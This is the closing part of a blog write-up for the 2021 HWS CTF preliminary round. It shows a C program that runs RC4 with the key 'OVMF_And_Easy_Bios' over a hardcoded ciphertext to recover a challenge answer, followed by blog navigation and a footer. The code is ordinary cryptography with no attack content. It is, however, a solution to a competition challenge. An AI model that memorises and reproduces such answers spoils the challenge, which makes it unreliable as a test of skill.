<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KEY 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_STR 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pos_i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> pos_j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sbox[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[MAX_KEY]=<span class="string">"OVMF_And_Easy_Bios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> *result)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[MAX_STR]=&#123;<span class="number">0x46</span>,<span class="number">0x77</span>,<span class="number">0x74</span>,<span class="number">0xB0</span>,<span class="number">0x27</span>,<span class="number">0x8E</span>,<span class="number">0x8F</span>,<span class="number">0x5B</span>,<span class="number">0xE9</span>,<span class="number">0xD8</span>,<span class="number">0x46</span>,<span class="number">0x9C</span>,<span class="number">0x72</span>,<span class="number">0xE7</span>,<span class="number">0x2F</span>,<span class="number">0x5E</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> result[MAX_STR]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	</span><br><span class="line">	len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    encryption((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)str,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)result);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> key_len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">        sbox[i]=i;</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)&#123;</span><br><span class="line">        j=(j+sbox[i]+key[i%key_len])%<span class="number">256</span>;</span><br><span class="line">        temp = sbox[i];</span><br><span class="line">        sbox[i] = sbox[j];</span><br><span class="line">        sbox[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">generate_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line"></span><br><span class="line">    pos_i=(pos_i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    pos_j = (pos_j+sbox[pos_i])%<span class="number">256</span>;</span><br><span class="line">    temp = sbox[pos_i];</span><br><span class="line">    sbox[pos_i] = sbox[pos_j];</span><br><span class="line">    sbox[pos_j] = temp;</span><br><span class="line">    t = (sbox[pos_i]+sbox[pos_j])%<span class="number">256</span>;</span><br><span class="line">    <span class="keyword">return</span> sbox[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encryption</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *plaintext,<span class="keyword">unsigned</span> <span class="keyword">char</span> * result)</span></span>&#123;</span><br><span class="line">    pos_i = <span class="number">0</span>;</span><br><span class="line">    pos_j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)plaintext);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    init_sbox();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">        result[i]=plaintext[i]^generate_key();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    result[i]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2021-08-17T01:29:17.253Z" itemprop="dateUpdated">2021-08-17 09:29:17</time>
</span><br>


        
    </div>
    
    <footer>
        <a href="https://veltavid.github.io">
            <img src="/img/avatar.jpg" alt="velta">
            velta
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://veltavid.github.io/2021/0811c4c4be.html&title=《2021HWS初赛writeup》 — velta's blog&pic=https://veltavid.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://veltavid.github.io/2021/0811c4c4be.html&title=《2021HWS初赛writeup》 — velta's blog&source=record velta's binary learning" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://veltavid.github.io/2021/0811c4c4be.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2021HWS初赛writeup》 — velta's blog&url=https://veltavid.github.io/2021/0811c4c4be.html&via=https://veltavid.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://veltavid.github.io/2021/0811c4c4be.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/08c22b0759.html" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">MIT-6.828-JOS-lab1实验笔记</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/08aa1d853a.html" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">几道有意思的Pwn题的复现</h4>
      </a>
    </div>
  
</nav>



    


<section class="comments" id="comments">
    <div id="disqus_thread"></div>
    <script>
    var disqus_shortname = 'true';
    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
</section>



















</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>velta &copy; 2021</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://veltavid.github.io/2021/0811c4c4be.html&title=《2021HWS初赛writeup》 — velta's blog&pic=https://veltavid.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://veltavid.github.io/2021/0811c4c4be.html&title=《2021HWS初赛writeup》 — velta's blog&source=record velta's binary learning" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://veltavid.github.io/2021/0811c4c4be.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2021HWS初赛writeup》 — velta's blog&url=https://veltavid.github.io/2021/0811c4c4be.html&via=https://veltavid.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://veltavid.github.io/2021/0811c4c4be.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://veltavid.github.io/2021/0811c4c4be.html" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
